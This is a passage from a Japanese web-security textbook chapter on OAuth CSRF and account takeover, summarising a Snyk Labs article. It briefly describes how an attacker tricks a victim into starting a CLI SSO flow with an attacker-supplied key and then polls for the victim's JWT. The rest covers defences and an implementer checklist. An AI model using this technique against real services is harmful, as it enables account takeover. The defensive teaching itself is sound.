5. callbackハンドラが認証済みセッションをキャッシュに保存（攻撃者供給のkeyで）
6. ターミナルが /sso/cli/poll/sk-... をポーリングしてJWTを取得
```

`/sso/key/generate` が**ブラウザではなくターミナル由来**のため、そもそもブラウザセッションと結合できない。攻撃者はフィッシングやポップアップで被害者に `/sso/key/generate?key=sk-ATTACKER&...`（攻撃者の key）を叩かせ、被害者が OAuth を完走したあと、攻撃者は自分の key でポーリングエンドポイントから**被害者の JWT を回収**できた。クロスデバイスフロー特有の「開始点と完了点が別デバイス」という性質が、CSRF 対策の前提（同一ブラウザ内の往復）を崩している点が本質である。

#### 防御——多層防御と正しい `state` 実装

記事は「以下は緩和策であって、正しい `state` 実装の代替ではない」と明確に釘を刺したうえで、多層防御を挙げている。

**1. CSP `frame-ancestors`**（iframe 経由のサイレント CSRF を封じる）

```
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.example;
```

**2. CHIPS（Cookie Partitioning）**（第三者 Cookie をトップレベルサイト単位で分離し、無関係サイト間の再利用を防ぐ。`Secure`・`SameSite=None` が必須）

```
Set-Cookie: __Host-example=value; SameSite=None; Secure;
Path=/; Partitioned;
```

**3. SameSite Cookie**（「SameSite は助けになるが完全な CSRF 対策ではない。特にトップレベルナビゲーションでは不十分」と記事は注意している）

そして、正しい `state` 実装の要件は次の通り。

```
標準フロー:
- 認可開始時にランダムな state クレームを Cookie に保存する
- 同じランダム値を state パラメータ（またはstate JWT）にも埋める
- callback で「Cookie保存値」と「戻ってきたstate値」を
  定数時間比較（constant-time comparison）で一致検証する
  （定数時間比較 = 比較にかかる時間が値の内容で変わらない実装。
    タイミング差からの推測を防ぐ）

クロスデバイスフロー（CLI/TV等）:
- prompt=consent で毎回新規の同意を強制する
- ターミナル/デバイスに表示したランダムコードの確認ステップを設ける
- トークン発行前に、そのコードをユーザーがブラウザで手入力させる
```

記事の締めくくり（要旨）は「このような重要コンポーネントのミスは高インパクトの脆弱性に直結する。正しい `state` 実装は交渉の余地なく必須である」。

> 出典: 1 Click, Zero Permission: How a Small OAuth Mistake Leads to Total Account Takeover part 2 — Snyk Labs — https://labs.snyk.io/resources/OAuth-mistake-takeover-part-two/

### まとめ——攻撃フローの整理と防御チェックリスト

2つの資料を通じて、OAuth における CSRF/ATO は次の2方向に大別できる。

- **攻撃者 code を被害者に使わせる（login / account linking CSRF）**: `state` の欠落（資料1）、または `state` はあるが予測可能・非結合（資料2の各 CVE）で成立。結果、攻撃者アイデンティティが被害者アカウントに紐付き、攻撃者が被害者アカウントに入れる。
- **被害者 code を攻撃者が奪う（code 窃取）**: `redirect_uri` の緩い検証（資料1）で成立。奪った code をトークン交換して被害者になりすます。

RP 実装者向けの最終チェックリスト。

- `state` を**必ず送る**。値はリクエスト単位の暗号論的乱数（条件2）。
- `state` を**開始ブラウザセッションに結合**して保存し、callback で照合（条件3）。外部キャッシュを使う場合もキーにセッションを混ぜる。
- 照合は**定数時間比較**で行い、不一致・欠落なら即フロー中断（条件1）。
- `state` を JWT で運ぶ場合も、中身に per-request 乱数を入れる。署名検証だけで満足しない。
- `redirect_uri` は IdP・RP 双方で**完全一致ホワイトリスト**。ワイルドカード・前方一致・サブドメイン許容は避ける。
- Cookie は `__Host-` プレフィックス＋`Secure` で Cookie Tossing を封じる。`frame-ancestors` で iframe CSRF を封じる。SameSite は補助に留め、`state` の代替にしない。
- クロスデバイス（CLI/TV）フローでは `prompt=consent` と手入力コード確認で、構造的に欠けるブラウザ結合を補う。

これらはいずれも「リクエストの出所を検証する」という CSRF 防御の原則を OAuth の各所に適用したものである。`state` を「ただ付ける」のではなく「存在・予測不能・セッション結合」の3条件で実装することが、OAuth を CSRF による ATO から守る核心である。


---

## ナビゲーション

[← 第7章 CORS攻撃の発展](07-cors-advanced.md)　｜　[📚 目次（ホーム）](index.md)　｜　[第9章 ツールと方法論 →](09-tooling.md)
